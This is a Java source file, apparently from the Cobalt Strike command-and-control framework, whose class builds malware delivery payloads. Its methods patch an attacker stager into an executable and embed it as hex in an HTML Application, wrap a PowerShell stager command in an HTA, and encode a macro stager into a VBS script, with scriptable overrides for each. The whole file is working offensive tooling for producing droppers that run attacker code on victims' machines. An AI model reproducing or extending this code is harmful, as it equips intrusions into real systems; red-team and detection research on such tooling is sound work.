package common;

import aggressor.AggressorClient;
import sleep.runtime.Scalar;
import sleep.runtime.SleepUtils;

import java.util.Stack;

public class MutantResourceUtils {
    protected AggressorClient client;

    public MutantResourceUtils(AggressorClient client) {
        this.client = client;
    }

    public byte[] getScriptedResource(String name, Stack args) {
        String result = this.client.getScriptEngine().format(name, args);
        if (result == null) {
            return new byte[0];
        }
        return CommonUtils.toBytes(result);
    }

    public byte[] getScriptedResource(String name, byte[] embedme, String argument) {
        Stack<Scalar> args = new Stack<>();
        args.push(SleepUtils.getScalar(argument));
        args.push(SleepUtils.getScalar(embedme));
        return this.getScriptedResource(name, args);
    }

    public byte[] getScriptedResource(String name, byte[] embedme) {
        Stack<Scalar> args = new Stack<>();
        args.push(SleepUtils.getScalar(embedme));
        return this.getScriptedResource(name, args);
    }

    public byte[] buildHTMLApplicationEXE(byte[] stager, String name) {
        byte[] exe_payload = new ArtifactUtils(this.client).patchArtifact(stager, "artifact32.exe");
        byte[] result = this.getScriptedResource("HTMLAPP_EXE", exe_payload, name);
        if (result.length == 0) {
            return this._buildHTMLApplicationEXE(exe_payload, name);
        }
        return result;
    }

    public byte[] _buildHTMLApplicationEXE(byte[] payload_exe, String name) {
        String app = CommonUtils.bString(CommonUtils.readResource("resources/htmlapp.txt"));
        app = CommonUtils.strrep(app, "##EXE##", ArtifactUtils.toHex(payload_exe));
        app = CommonUtils.strrep(app, "##NAME##", name);
        return CommonUtils.toBytes(app);
    }

    public byte[] buildHTMLApplicationPowerShell(byte[] stager) {
        byte[] command = new PowerShellUtils(this.client).buildPowerShellCommand(stager);
        byte[] result = this.getScriptedResource("HTMLAPP_POWERSHELL", command);
        if (result.length == 0) {
            return this._buildHTMLApplicationPowerShell(command);
        }
        return result;
    }

    public byte[] _buildHTMLApplicationPowerShell(byte[] command) {
        String temp = CommonUtils.bString(CommonUtils.readResource("resources/htmlapp2.txt"));
        temp = CommonUtils.strrep(temp, "%%DATA%%", CommonUtils.bString(command));
        return CommonUtils.toBytes(temp);
    }

    public byte[] buildVBS(byte[] stager) {
        byte[] macro = new ResourceUtils(this.client).buildMacro(stager);
        byte[] result = this.getScriptedResource("RESOURCE_GENERATOR_VBS", macro);
        if (result.length == 0) {
            return this._buildVBS(macro);
        }
        return result;
    }

    public byte[] _buildVBS(byte[] macro) {
        String script = CommonUtils.bString(CommonUtils.readResource("resources/template.vbs")).trim();
        script = CommonUtils.strrep(script, "$$CODE$$", ArtifactUtils.toVBS(macro));
        return CommonUtils.toBytes(script);
    }
}

